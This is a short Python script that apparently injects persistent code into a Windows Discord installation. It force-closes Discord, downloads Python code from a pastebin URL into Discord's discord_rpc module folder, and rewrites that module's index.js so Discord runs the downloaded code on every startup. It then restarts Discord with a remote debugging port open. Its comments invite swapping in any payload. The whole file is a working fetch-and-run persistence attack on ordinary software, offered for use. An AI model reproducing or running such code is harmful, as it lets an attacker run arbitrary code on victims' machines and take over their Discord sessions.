import os, shutil, requests

# Other py code needs subprocess so we will install it here
try:
    import subprocess
except:
    os.system("pip install subprocess")

def yes():
    os.system('taskkill /IM "Discord.exe" /F') # Closing discord
    f = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//file.py", "w")
    f.write(requests.get("https://pastebin.com/raw/aGaAgRjN").text) # Getting py code from a pastebin (You can replace this with any py code if u want)
    f.close()
    t = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//index.js", "w")
    t.write("""
module.exports = {
  RPCIPC: require('./RPCIPC'),
  RPCWebSocket: require('./RPCWebSocket'),
};

var process = require('child_process');
process.exec('python""" + f" C://Users//{os.getenv('username')}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//file.py'" + """ ,function (err,stdout,stderr) {
    if (err) {
        console.log(stderr);
    } else {
        console.log(stdout);
    }
});
""")# ^^This changes the text of a js file discord loads on startup (You could change this to any js code as long as you keep the module.exports part)
    f.close()
    subprocess.Popen("Discord.exe --remote-debugging-port=420") # Opening wiht debugging port bc it didnt start again without it

yes()


